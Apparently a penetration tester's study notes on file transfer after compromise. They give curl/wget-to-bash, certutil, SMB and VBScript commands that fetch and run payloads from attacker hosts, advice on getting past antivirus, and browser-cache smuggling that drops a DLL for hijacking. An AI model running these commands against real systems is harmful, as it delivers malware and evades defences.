One of the biggest problem on this phase are **anti viruses**.
A great method to bypass this issue is to use legitimate administrative tools. Second problem is the non-interactive shell. We have to use non-interactive tools to achieve our goals to upload files it we do not have a full interactive shell.

## Hosting files

Files have to be hosted somewhere in order to be downloaded after. The most common places are:

- [HTTP Server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#HTTP%20Server)
- [FTP Server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#FTP%20Server)
- [SMB](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#SMB)

---

# Unix tools and methods

- **curl**
    
    ```bash
    curl 192.168.119.209/file.sh -o file.sh		# save file locally
    curl 192.168.119.209/file.sh | bash			# in memory execution
    ```
    
- **wget**
    
    ```bash
    wget 192.168.119.209/file.sh -O file.sh		# save file locally
    wget -O - 192.168.119.209/file.sh | bash	# in memory execution
    ```
    
- [netcat](../Tools/netcat.md#File%20transfer)
- **scripting languages**
- **scp**
- **pure-ftpd**
- **HTTP/HTTPS**

---

# Windows tools and methods

## FTP Script (`ftp -s`)

Server: [FTP Server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#FTP%20Server)
Script:

```powershell
echo open 10.11.0.4 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

Shell command:

```powershell
C:\Users\offsec> ftp -v -n -s:ftp.txt
```

## TFTP

[TFTP - Trivial File Transfer Protocol](../Services/TFTP%20-%20Trivial%20File%20Transfer%20Protocol.md) is a UDP based file transfer protocol, often restricted by egress firewall rules. Old version of Windows (up to XP and 2003) contains it as default.
Server: [TFTP Server](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#TFTP)
Client:

```powershell
C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s

C:\Users\Offsec> tftp -i 10.11.0.4 get important.docx
Transfer successful: 359250 bytes in 96 second(s), 3712 bytes/s
```

## VB Script (`cscript wget.vbs`)

Copy-Paste sequence:

```visual-basic
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Shell command:

```powershell
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

## Powershell
[File Transfer](../Dev,%20scripting%20&%20OS/Powershell%20for%20pentesters.md#File%20Transfer) using built-in Powershell features

## Assembling disassembled binary (`exe2hex` and `exe2bat`)

Disassembling the original program:

```bash
kali@kali:~$ upx -9 nc.exe
	Ultimate Packer for eXecutables
	Copyright (C) 1996 - 2018
	UPX 3.95 Markus Oberhumer, Laszlo Molnar & John Reiser Aug 26th 2018
	File size Ratio Format Name
	-------------------- ------ ----------- -----------
	59392 -> 29696 50.00% win32/pe nc.exe
Packed 1 file.
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd
[*] exe2hex v1.5.1
[+] Successfully wrote (PoSh) nc.cmd

# Legacy
root@kali:~$ locate exe2bat
root@kali:~$ wine /usr/share/windows-binaries/exe2bat nc.exe nc_legacy.cmd
```

Re-building the program:

```bash
# Incollo i comandi ottenuti con exe2hex

# incollo i comandi ottenuti con exe2bat
debug <123.hex
```

## SMB

Server: [SMB ](../Dev,%20scripting%20&%20OS/Dynamic%20Servers.md#SMB)
Client:

```powershell
C:> net view \\AttackerIP   // Our designated share name should be visible in the output
C:> dir \\AttackerIP\transfer_share
C:> copy \\AttackerIP\transfer_share\shell.exe
C:> \\AttackerIP\transfer_share\shell.exe

# Mounting authenticated shares
PS C:\Program Files (x86)\StorageService> net use \\192.168.119.209 /user:maoutis Qwerty
The command completed successfully.

PS C:\Program Files (x86)\StorageService> net use \\192.168.119.209 /delete
\\192.168.119.209 was deleted successfully.
```

## certutil

```powershell
certutil -urlcache -split -f http://AttackerIP/file C:\path\to\out\file
```

# Alternative and circumstantial situations

## Browser Cache Smuggling

Modern browsers (Firefox) implemented a mechanism that allow them storing static files locally on the computer in order not to reload them every time. This mechanism is called the browser cache, but it will not cache any files proposed by a server, but only static resources.

Our goal is to force the download of either a DLL or an executable. To do so, we’ll simply have to change the content type related to the dll and exe files from: `application/x-msdos-program` to `image/jpg`. and serves it as an image: [^browser-cache-smug]

```html
<img src=evilDll.dll>
```

[^browser-cache-smug]: [Aurélien Chalot - Browser Cache Smuggling](../../Readwise/Articles/Aurélien%20Chalot%20-%20Browser%20Cache%20Smuggling.md)

Because cached files are saved without extension and with a random name, we need to inject some custom metadata in order to find them easily. We can do it using custom Tags on our web server configuration:

```
server {
	listen 80 default_server;
	listen [::]:80 default_server;
	root /var/www/html;
	index index.html index.htm index.nginx-debian.html;
	server_name _;

	# Adding the header used to find the real DLL
	location /evilDll.dll {
		add_header Tag DLLHERE;
	}
}
```

We can find those tags using powershell: 

```powershell
foreach ($f in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")){Get-ChildItem $f -Recurse|%{if(Select-String -Pattern "DLLHERE" -Path $_.FullName){copy $_.FullName $env:LOCALAPPDATA\Microsoft\OneDrive\CRYPTBASE.dll}}}
```

## File transfer using WireGuard

`wush` [^wush] is a command line tool that lets you easily transfer files and open shells over a peer-to-peer WireGuard connection. It works both on Linux and Windows. Download the binaries or the source code from [github](https://github.com/coder/wush/releases).

[^wush]: [Erik - Last Week in Security (LWiS) - 2024-09-03](../../Readwise/Articles/Erik%20-%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-09-03.md#^edb065)



---

# External References:

- [https://github.com/LOLBAS-Project/LOLBAS](https://github.com/LOLBAS-Project/LOLBAS)